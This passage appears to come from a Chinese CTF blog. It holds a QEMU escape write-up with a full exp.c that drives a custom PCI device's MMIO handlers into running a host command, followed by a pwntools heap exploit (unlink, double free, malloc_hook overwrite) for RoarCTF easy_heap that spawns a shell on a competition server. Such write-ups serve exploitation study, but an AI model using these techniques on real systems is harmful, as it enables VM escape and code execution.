<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">pci_rfid_realize</span><span class="params">(__int64 pdev, __int64 errp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_570742(*(_QWORD *)(pdev + <span class="number">120</span>), <span class="number">1L</span>L);</span><br><span class="line">  <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_5C950D(pdev, <span class="number">0L</span>L, <span class="number">1L</span>L, <span class="number">1L</span>L, <span class="number">0L</span>L, errp) )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_570635(pdev + <span class="number">2688</span>, <span class="number">1L</span>L, sub_570A2E, pdev);</span><br><span class="line">    sub_843CE1(pdev + <span class="number">2520</span>);</span><br><span class="line">    sub_843FBD(pdev + <span class="number">2576</span>);</span><br><span class="line">    sub_8449B4(pdev + <span class="number">2512</span>, <span class="string">"rfid"</span>, what, pdev, <span class="number">0L</span>L);</span><br><span class="line">    sub_31B892(pdev + <span class="number">2272</span>, pdev, rfid_mmio_ops, pdev, <span class="string">"rfid-mmio"</span>, &amp;off_1000000);</span><br><span class="line">    sub_5C1EF2((_QWORD *)pdev, <span class="number">0</span>, <span class="number">0</span>, pdev + <span class="number">2272</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这时候再找个以前做过的qemu题，看看里面函数的参数，可以发现<code>sub_31B892</code>这个函数有6个参数且有字符串<code>rfid-mmio</code>，这就很显然这个函数是<code>memory_region_init_io</code>，而里面的第三个参数就是<code>rfid_mmio_ops</code>了。点进去看下，第一个函数指针是<code>rfid_mmio_read</code>，第二个是<code>rfid_mmio_write</code>。如此一来就找到了关键的<code>read/write</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000F</span>E9720 rfid_mmio_ops   dq offset rfid_mmio_read</span><br><span class="line">.data.rel.ro:<span class="number">0000000000F</span>E9720                                         ; DATA XREF: pci_rfid_realize+<span class="number">111</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000F</span>E9728                 dq offset rfid_mmio_write</span><br></pre></td></tr></table></figure>
<p>先看<code>rfid_mmio_read</code>，第二个参数为我们输入的地址，判断<code>((addr &gt;&gt; 20) &amp; 0xF) != 15</code>，后面比较两个字符串，后者为<code>wwssadadBABA</code>，前者根据引用发现赋值来自<code>rfid_mmio_write</code>，比较成功之后执行<code>command</code>，看引用也来自<code>rfid_mmio_write</code>，下面分析write函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">rfid_mmio_read</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( ((addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>) != <span class="number">15</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(off_10CC100);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(input, off_10CC100, v2) )</span><br><span class="line">      system(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">270438L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>rfid_mmio_write</code>函数的逻辑实际上就是个小菜单，<code>(addr &gt;&gt; 20) &amp; 0xF</code>作为<code>result</code>。<br>如果<code>result</code>为<code>[0,5]</code>，就给<code>input[idx]</code>赋不同的固定值，<code>idx</code>为<code>(addr &gt;&gt; 16) &amp; 0xF</code>;如果<code>result</code>为<code>6</code>，就往<code>command</code>里拷贝数据，<code>src</code>为<code>&amp;n[4]</code>，而在程序开始我们<code>*(_QWORD *)&amp;n[4] = value;</code>将value赋值给了它，因此这里的<code>memcpy</code>实际上等同于<code>command[(unsigned __int16)arg11] = value</code>。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">_BYTE *__fastcall <span class="title">rfid_mmio_write</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 addr, __int64 value, <span class="keyword">unsigned</span> <span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> n[<span class="number">12</span>]; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 arg11; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+2Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> idx; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [rsp+34h] [rbp-Ch]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  arg11 = addr;</span><br><span class="line">  *(_QWORD *)&amp;n[<span class="number">4</span>] = value;</span><br><span class="line">  v11 = a1;</span><br><span class="line">  v8 = (addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  idx = (addr &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">  result = (_BYTE *)((addr &gt;&gt; <span class="number">20</span>) &amp; <span class="number">0xF</span>);</span><br><span class="line">  <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> __int64)result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'w'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'s'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'a'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'d'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'A'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">5u</span>LL:</span><br><span class="line">      <span class="keyword">if</span> ( idx &gt;= <span class="number">0</span> &amp;&amp; idx &lt;= <span class="number">15</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input;</span><br><span class="line">        input[idx] = <span class="string">'B'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">6u</span>LL:</span><br><span class="line">      v10 = (<span class="keyword">unsigned</span> __int16)arg11;</span><br><span class="line">      result = <span class="built_in">memcpy</span>(&amp;command[(<span class="keyword">unsigned</span> __int16)arg11], &amp;n[<span class="number">4</span>], size);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>综上所述，我们那两轮<code>rfid_mmio_write</code>设置<code>input</code>为<code>wwssadadBABA</code>，设置<code>command</code>为<code>gnome-calculator</code>，最后调用<code>rfid_mmio_read</code>触发<code>system(&quot;gnome-calculator&quot;)</code>，弹出计算器</p>
<h3 id="exp-c-2"><a href="#exp-c-2" class="headerlink" title="exp.c"></a>exp.c</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/io.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* mmio_mem;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">die</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    perror(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmio_write</span><span class="params">(<span class="keyword">uint64_t</span> choice,<span class="keyword">uint64_t</span> idx,<span class="keyword">uint64_t</span> chr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> addr = ((choice &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> value = <span class="number">0</span>;</span><br><span class="line">    addr += ((idx &amp; <span class="number">0xf</span>) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"the addr is 0x%lx\n"</span>,addr);</span><br><span class="line">    <span class="keyword">if</span>(choice == <span class="number">6</span>)&#123;</span><br><span class="line">        <span class="comment">//write command </span></span><br><span class="line">        value = chr;</span><br><span class="line">        addr = idx;</span><br><span class="line">        addr += (((choice &amp; <span class="number">0xf</span>)) &lt;&lt; <span class="number">20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    *((<span class="keyword">uint64_t</span> *)(mmio_mem+addr)) = value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint64_t</span> <span class="title">mmio_read</span><span class="params">(<span class="keyword">uint64_t</span> addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *((<span class="keyword">uint64_t</span>*)(mmio_mem+addr));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">// Open and map I/O memory for the strng device</span></span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">"/sys/devices/pci0000:00/0000:00:04.0/resource0"</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">"mmio_fd open failed"</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">"mmap mmio_mem failed"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mmio_mem @ %p\n"</span>, mmio_mem);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//write command</span></span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">0</span>,<span class="number">0x67</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">1</span>,<span class="number">0x6e</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">2</span>,<span class="number">0x6f</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">3</span>,<span class="number">0x6d</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">4</span>,<span class="number">0x65</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">5</span>,<span class="number">0x2d</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">6</span>,<span class="number">0x63</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">7</span>,<span class="number">0x61</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">8</span>,<span class="number">0x6c</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">9</span>,<span class="number">0x63</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">10</span>,<span class="number">0x75</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">11</span>,<span class="number">0x6c</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">12</span>,<span class="number">0x61</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">13</span>,<span class="number">0x74</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">14</span>,<span class="number">0x6f</span>);</span><br><span class="line">    mmio_write(<span class="number">6</span>,<span class="number">15</span>,<span class="number">0x72</span>);</span><br><span class="line">    <span class="comment">//write to input</span></span><br><span class="line">    <span class="comment">//wwssadadBABA</span></span><br><span class="line">    mmio_write(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">1</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">1</span>,<span class="number">3</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">2</span>,<span class="number">4</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">3</span>,<span class="number">5</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">2</span>,<span class="number">6</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">3</span>,<span class="number">7</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">5</span>,<span class="number">8</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">4</span>,<span class="number">9</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">5</span>,<span class="number">10</span>,<span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">4</span>,<span class="number">11</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    mmio_read((<span class="number">1</span> &lt;&lt; <span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/2020/09/03/strng/6.png" alt="res"></p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这三道题应该是逃逸类题目里最简单的类型，像是glibc pwn的数组越界，只要理解利用的原理就不难做，希望新的一年自己能学更多东西，努力追赶少年时的梦想。</p>
]]></content>
      <categories>
        <category>qemu escape</category>
      </categories>
  </entry>
  <entry>
    <title>RoarCTF/巅峰极客挑战赛线上/UNCTF/上海市大学生网络安全大赛/湖湘杯复赛/红帽杯 部分pwn write up</title>
    <url>/2020/09/03/total1/</url>
    <content><![CDATA[<h1 id="RoarCTF-巅峰极客挑战赛线上-UNCTF-上海市大学生网络安全大赛-湖湘杯复赛-红帽杯-部分pwn-write-up"><a href="#RoarCTF-巅峰极客挑战赛线上-UNCTF-上海市大学生网络安全大赛-湖湘杯复赛-红帽杯-部分pwn-write-up" class="headerlink" title="RoarCTF/巅峰极客挑战赛线上/UNCTF/上海市大学生网络安全大赛/湖湘杯复赛/红帽杯 部分pwn write up"></a>RoarCTF/巅峰极客挑战赛线上/UNCTF/上海市大学生网络安全大赛/湖湘杯复赛/红帽杯 部分pwn write up</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近越来越懒了，想想还是得整理一下最近做过的题</p>
<h2 id="RoarCTF"><a href="#RoarCTF" class="headerlink" title="RoarCTF"></a>RoarCTF</h2><h3 id="easy-heap"><a href="#easy-heap" class="headerlink" title="easy_heap"></a>easy_heap</h3><p>scanf可以触发合并得到ub，一开始以为只能Add16次，后来发现不是的，0的时候if的确进不去，但是仍会-1导致之后可以继续Add，同理free也不限制次数，存在double free和UAF，没有开PIE，改掉0x602090可以Show，通过unlin泄露地址最后覆盖realloc和malloc_hook拿shell </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>,<span class="string">'split'</span>,<span class="string">'-h'</span>]</span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn'</span>)</span><br><span class="line">libc_offset = <span class="number">0x3c4b20</span></span><br><span class="line">gadgets = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">'./pwn'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">'39.97.182.233'</span>,<span class="number">31472</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Init</span><span class="params">(name,info)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"please input your username:"</span>)</span><br><span class="line">    p.send(name)</span><br><span class="line">    p.recvuntil(<span class="string">"please input your info:"</span>)</span><br><span class="line">    p.send(info)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"input the size"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"please input your content"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Add1</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    time.sleep(<span class="number">0.02</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    time.sleep(<span class="number">0.02</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    time.sleep(<span class="number">0.02</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'&gt;&gt; '</span>)</span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete1</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'2'</span>)</span><br><span class="line">    time.sleep(<span class="number">0.02</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MagicBuild</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"666"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"build or free?"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"please input your content"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MagicBuild1</span><span class="params">(content)</span>:</span></span><br><span class="line">    p.sendline(<span class="string">'666'</span>)</span><br><span class="line">    time.sleep(<span class="number">0.02</span>)</span><br><span class="line">    p.sendline(<span class="string">'1'</span>)</span><br><span class="line">    time.sleep(<span class="number">0.02</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line">    time.sleep(<span class="number">0.02</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MagicFree</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"666"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">"build or free?"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">MagicFree1</span><span class="params">()</span>:</span></span><br><span class="line">    p.sendline(<span class="string">"666"</span>)</span><br><span class="line">    time.sleep(<span class="number">0.02</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    time.sleep(<span class="number">0.02</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#unlink</span></span><br><span class="line">    m_chk = <span class="number">0x602088</span></span><br><span class="line">    c_chk = <span class="number">0x602098</span></span><br><span class="line">    fake_chunk = <span class="number">0x602088</span><span class="number">-0x18</span></span><br><span class="line">    name = p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(<span class="number">0x602060</span>+<span class="number">0x40</span>)</span><br><span class="line">    info = p64(<span class="number">0x40</span>)+p64(<span class="number">0x41</span>)</span><br><span class="line">    Init(name,info)</span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    fd = m_chk - <span class="number">0x18</span></span><br><span class="line">    bk = m_chk - <span class="number">0x10</span></span><br><span class="line">    Add(<span class="number">0x18</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x71</span>))<span class="comment">#0</span></span><br><span class="line">    Add(<span class="number">0x28</span>,<span class="string">'1'</span>)<span class="comment">#1</span></span><br><span class="line">    <span class="comment">#Delete()</span></span><br><span class="line">    MagicBuild(<span class="string">'m0'</span>)</span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'2'</span>)<span class="comment">#2</span></span><br><span class="line">    MagicFree()</span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'3'</span>)<span class="comment">#3</span></span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'4'</span>)<span class="comment">#4</span></span><br><span class="line">    Delete()</span><br><span class="line">    MagicFree()</span><br><span class="line">    Delete()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">#</span></span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'\x10'</span>)<span class="comment">#5</span></span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'6'</span>)<span class="comment">#6</span></span><br><span class="line">    Add(<span class="number">0x68</span>,<span class="string">'7'</span>)<span class="comment">#7</span></span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(fd)+p64(bk)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(<span class="number">0x30</span>)+p64(<span class="number">0xb0</span>+<span class="number">0x70</span>)</span><br><span class="line">    Add(<span class="number">0x68</span>,payload)<span class="comment">#8</span></span><br><span class="line">    p.recvuntil(<span class="string">"&gt;&gt; "</span>)</span><br><span class="line">    p.sendline(<span class="string">"666"</span>)</span><br><span class="line"></span><br><span class="line">    MagicFree()</span><br><span class="line">    Delete()</span><br><span class="line">    Add(<span class="number">0x30</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">0xDEADBEEFDEADBEEF</span>)+<span class="string">"\x30"</span>)<span class="comment">#9</span></span><br><span class="line">    Show()</span><br><span class="line">    libc_base = u64(p.recvline().strip(<span class="string">'\n'</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - libc.sym[<span class="string">'free'</span>]</span><br><span class="line">    log.success(<span class="string">"libc base =&gt; "</span> + hex(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line"></span><br><span class="line">    Add1(<span class="number">0x68</span>,<span class="string">'10'</span>)</span><br><span class="line">    Add1(<span class="number">0x68</span>,<span class="string">'11'</span>)</span><br><span class="line">    Delete1()</span><br><span class="line">    MagicFree1()</span><br><span class="line">    Delete1()</span><br><span class="line">    Add1(<span class="number">0x68</span>,p64(libc_base+libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))</span><br><span class="line">    Add1(<span class="number">0x68</span>,<span class="string">'13'</span>)</span><br><span class="line">    Add1(<span class="number">0x68</span>,<span class="string">'14'</span>)</span><br><span class="line">    realloc = libc_base + libc.sym[<span class="string">'realloc'</span>]</span><br><span class="line">    one_gadget = libc_base + gadgets[<span class="number">1</span>]</span><br><span class="line">    Add1(<span class="number">0x68</span>,<span class="string">'\x00'</span>*<span class="number">11</span>+p64(one_gadget)+p64(realloc+<span class="number">0x2</span>))</span><br><span class="line">    <span class="comment">#4 9 14</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    MagicFree1()</span><br><span class="line"></span><br><span class="line">    MagicFree1()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">def my_exit(signum,frame):</span></span><br><span class="line"><span class="string">    sys.exit()</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">while True:</span></span><br><span class="line"><span class="string">    signal.signal(signal.SIGINT,my_exit)</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        exp()</span></span><br><span class="line"><span class="string">        p.interactive()</span></span><br><span class="line"><span class="string">        p.close()</span></span><br><span class="line"><span class="string">    except:</span></span><br><span class="line"><span class="string">        p.close()</span></span><br><span class="line"><span class="string">    if debug:</span></span><br><span class="line"><span class="string">        p = process('./pwn')</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        p = remote('39.97.182.233',31472)</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
<h3 id="realloc-magic"><a href="#realloc-magic" class="headerlink" title="realloc_magic"></a>realloc_magic</h3><p>和今年的Tokyo Westen比赛的realloc基本一模一样，利用realloc的合并性质，让一个chunk释放7次进入ub，同时它也在tcache里，在它前面搞一个chunk，realloc的时候会把这个ub给合并进去，最终达到overlapping的效果</p>
